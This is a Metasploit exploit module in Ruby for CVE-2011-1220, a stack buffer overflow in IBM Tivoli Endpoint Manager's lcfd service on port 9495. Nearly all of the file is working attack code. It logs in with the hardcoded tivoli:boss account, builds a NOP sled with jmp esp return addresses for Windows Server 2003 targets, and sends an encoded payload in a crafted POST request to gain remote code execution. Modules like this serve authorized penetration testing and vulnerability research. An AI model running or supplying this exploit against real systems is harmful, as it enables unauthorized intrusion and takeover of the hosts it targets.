# $Id: ibm_tivoli_endpoint_bof.rb 12925 2011-06-12 00:04:55Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;IBM Tivoli Endpoint Manager POST Query Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow in the way IBM Tivoli
                Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query
                arguments.
 
                This issue can be triggered by sending a specially crafted HTTP POST request to
            the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization
            is required. This exploit makes use of a second vulnerability, a hardcoded account
            (tivoli/boss) is used to bypass the authorization restriction.
            },
            &#039;Author&#039;         =>
                [
                    &#039;bannedit&#039;, # metasploit module
                    &#039;Jeremy Brown <0xjbrown[at]gmail.com>&#039;, # original public exploit
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12925 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-1220&#039;],
                    [ &#039;OSVDB&#039;, &#039;72713&#039;], # buffer overflow
                    [ &#039;OSVDB&#039;, &#039;72751&#039;], # hardcoded account
                    [ &#039;BID&#039;, &#039;48049&#039;],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-169/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 400,
                    &#039;BadChars&#039; => "\x00\x0d\x0a",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Windows Server 2003 SP0&#039;, { &#039;Ret&#039; => 0x77d80787 }], # user32.dll - jmp esp
                    [&#039;Windows Server 2003 SP1&#039;, { &#039;Ret&#039; => 0x77403680 }], # user32.dll - jmp esp
                    [&#039;Windows Server 2003 SP2&#039;, { &#039;Ret&#039; => 0x77402680 }], # user32.dll - jmp esp
                ],
            &#039;DisclosureDate&#039; => &#039;May 31 2011&#039;))
 
        register_options(
            [
                Opt::RPORT(9495),
            ], self.class )
    end
 
    def exploit
        print_status("Trying target #{target.name}...")
 
        auth = Rex::Text.encode_base64("tivoli:boss")
        varname = rand_text_alpha(rand(10))
 
        sploit = make_nops(1) * 256
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << payload.encoded
         
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        res = send_request_cgi({
            &#039;uri&#039;          => &#039;/addr&#039;,
            &#039;method&#039;       => &#039;POST&#039;,
            &#039;headers&#039;      =>
            {
                &#039;Authorization&#039; => "Basic #{auth}"
            },
            &#039;vars_post&#039;    =>
            {
                varname => sploit,
            },
        }, 5)
 
        handler
    end
end



